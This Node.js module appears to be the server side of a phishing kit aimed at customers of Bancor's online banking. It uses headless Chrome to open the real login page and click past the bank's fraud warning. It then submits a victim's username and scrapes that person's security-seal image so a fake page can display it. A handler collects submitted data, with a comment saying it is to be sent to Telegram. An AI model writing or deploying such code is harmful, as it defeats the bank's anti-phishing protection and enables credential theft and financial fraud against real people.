module.exports = httpServer => {

    const chrm = require("chromedriver");
    // Include selenium webdriver
    const swd = require("selenium-webdriver");
    const chrome = require("selenium-webdriver/chrome");
    const firefox = require("selenium-webdriver/firefox");


    const { Server } = require("socket.io");
    const io = new Server(httpServer);

    var socketImg = []

    io.on("connection", socket => {

        // Mostrar imagen login
        socket.on("ShowAvatar", data => {

            let browser = new swd.Builder();
            let tab = browser.forBrowser("chrome")
                .setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
                .setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
                .build();

            //Step 1 - Opening sign in page
            let tabToOpenSignIn =
                tab.get("https://bancon.bancor.com.ar/frontend/login/");

            tabToOpenSignIn
                .then(() => {
                    // Timeout to wait if connection is slow
                    let findTimeOutP =
                        tab.manage().setTimeouts({
                            implicit: 15000, // 15 seconds
                        });
                    return findTimeOutP;
                })
                .then(() => {
                    //aceptar estafa
                    let entendidoBtn =
                        tab.findElement(swd.By.xpath("//a[contains(text(), 'Entendido')]"));
                    return entendidoBtn;
                })
                .then(promiseEntendidoBtn => {
                    let promiseClickIngresar = promiseEntendidoBtn.click();
                    return promiseClickIngresar;
                })
                .then(() => {
                    //Finding the username input
                    let promiseUsernameBox = tab.findElement(swd.By.css("#field_username"))
                        .catch(() => {
                            tab.quit();
                            io.to(data.socket).emit("ErrorLogin", 'En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.');
                            throw new Error("Mantenimiento");
                        })
                    return promiseUsernameBox;
                })
                //Entering the username
                .then(usernameBox => {
                    let promiseFillUsername =
                        usernameBox.sendKeys(data.user);
                    return promiseFillUsername;
                })
                .then(() => {
                    console.log("Username entered successfully");
                    let promiseBtnIngresar =
                        tab.findElement(swd.By.css("#btn_submit_first_step"));
                    return promiseBtnIngresar;
                })
                .then(promiseBtnIngresar => {
                    let promiseClickIngresar = promiseBtnIngresar.click();
                    return promiseClickIngresar;
                })
                .then(() => {
                    //Finding the img avatar
                    setTimeout(() => {
                        let promiseAvatarImg =
                            tab.findElement(swd.By.css("#security-seal")).getAttribute('src')
                                .then(AvatarImg => {
                                    socketImg.push({ 'socket': data.socket, 'img': AvatarImg });
                                    io.to(data.socket).emit("AvatarElement", AvatarImg);
                                    tab.quit();
                                })
                    }, 1000);
                })
                .catch(err => {
                    console.log("Error ", err, " occurred!");
                });
        })


        socket.on("EmitData", data => {
            //AQUI ENVIAR LA INFO AL TELEGRAM
            console.log(data);
        })

    })
}